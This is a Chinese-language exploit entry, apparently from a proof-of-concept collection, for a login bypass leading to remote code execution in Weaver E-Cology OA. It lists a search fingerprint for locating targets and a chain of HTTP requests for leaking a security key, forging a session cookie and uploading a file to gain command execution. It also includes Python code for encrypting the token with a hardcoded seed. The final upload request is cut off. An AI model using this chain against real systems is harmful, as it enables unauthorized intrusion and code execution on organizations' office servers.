# 泛微E-Cology前台登录绕过导致后台rce漏洞

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="泛微-OA（e-cology）"`
- **请求**：`POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf HTTP/1.1`

**请求体 / payload**
```
通过/dwr/call/plaincall获取对应的security.key
Host:
取security.key进行AES加密
import hashlib
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
def encrypt(data, seed_str):
seed = seed_str.encode('utf-8')
first_hash = hashlib.sha1(seed).digest()
key_bytes = hashlib.sha1(first_hash).digest()[:16]
cipher = AES.new(key_bytes, AES.MODE_ECB)
plaintext = data.encode('utf-8')
padded = pad(plaintext, AES.block_size)
ciphertext = cipher.encrypt(padded)
return ciphertext.hex().upper()
if __name__ == "__main__":
data = "1;1;" + str(int(time.time() * 1000))
seed = "4bbc40a9-7786-4b"
print(encrypt(data, seed))
取AES加密后值
CEF202B9A449256743022A93A4B5E494AB411D1AF909892C2CDE3B48E984DD49
3、将AES值带入到mToken中
GET /mobilemode/mobile/server.jsp?invoker=com.api.mobilemode.web.mobile.service.MobileEntranceAction&action=meta&appid=1&appHomepageId=1&mTokenFrom=QRCode&mToken=CEF202B9A449256743022A93A4B5E494AB411D1AF909892C2CDE3B48E984DD49&_ec_ismobile=true&timeZoneOffset=&a=.swf HTTP/1.1
Host:
在第三步获取sessionKey
4140afde-219c-482a-9964-99182b42b1ea
4、
GET /weaver/ImgFileDownload/a.swf?sessionkey=4140afde-219c-482a-9964-99182b42b1ea&a=.swf HTTP/1.1
Host:
用其生成ecology_JSessionid
将ecology_JSessionid写入cookie
后台RCE
调用接口生成1.swf
POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
Host:
If-None-Match: "6evu6PUo/Cz"
If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnIIu
Cookie: ecology_JSessionid=aaaorS3wPu-z9gMMGpO…（脚本共 3592 字，完整版见原文）
```
- **预期**：200　|　—